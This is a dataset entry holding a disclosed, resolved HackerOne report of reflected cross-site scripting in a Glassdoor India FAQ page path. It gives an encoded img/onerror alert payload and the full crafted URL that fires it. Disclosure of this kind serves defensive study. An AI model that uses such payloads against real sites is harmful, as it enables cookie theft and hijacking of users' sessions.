---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '1016253'
original_report_id: '1016253'
title: Reflected XSS at https://www.glassdoor.co.in/FAQ/Microsoft-Question-FAQ200086-E1651.htm?countryRedirect=true
  via PATH
weakness: Cross-site Scripting (XSS) - Reflected
team_handle: glassdoor
created_at: '2020-10-22T12:31:56.093Z'
disclosed_at: '2021-04-16T02:56:06.992Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 33
asset_identifier: https://www.glassdoor.com/*
asset_type: WILDCARD
max_severity: critical
tags:
- hackerone
- cross-site-scripting-xss-reflected
---

# Reflected XSS at https://www.glassdoor.co.in/FAQ/Microsoft-Question-FAQ200086-E1651.htm?countryRedirect=true via PATH

## Metadata

- HackerOne Report ID: 1016253
- Weakness: Cross-site Scripting (XSS) - Reflected
- Program: glassdoor
- Disclosed At: 2021-04-16T02:56:06.992Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

**Summary:** 
The endpoint https://www.glassdoor.co.in/FAQ/Microsoft-Question-FAQ200086-E1651.htm?countryRedirect=true  is vulnerable to reflected XSS.
Injecting any input in path will be reflected back without any sanitisation.
 
Affected URL or select Asset from In-Scope: https://www.glassdoor.co.in/FAQ/Microsoft-Question-FAQ200086-E1651.htm?countryRedirect=true
Injection point: Path
Vulnerability Type: Reflected XSS
Browsers tested: Safari, Chrome, Firefox
Payload: %22%3e%3cimg%20onerro%3d%3e%3cimg%20src%3dx%20onerror%3dalert%601%60%3e

## Steps To Reproduce:

  1. Navigate to https://www.glassdoor.co.in/FAQ/Microsoft-Question-FAQ200086-E1651.htm?countryRedirect=true
  2. input the payload inside path.

  3.Open this url: https://www.glassdoor.co.in/FAQ/Mic%22%3e%3cimg%20onerro%3d%3e%3cimg%20src%3dx%20onerror%3dalert%601%60%3e
rosoft-Question-FAQ200086-E1651.htm?countryRedirect=true

  An alert will be popped up.

## Impact

Using XSS an attacker can steals the victim cookie and can also redirect him to a malicious site controlled by the attacker.

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
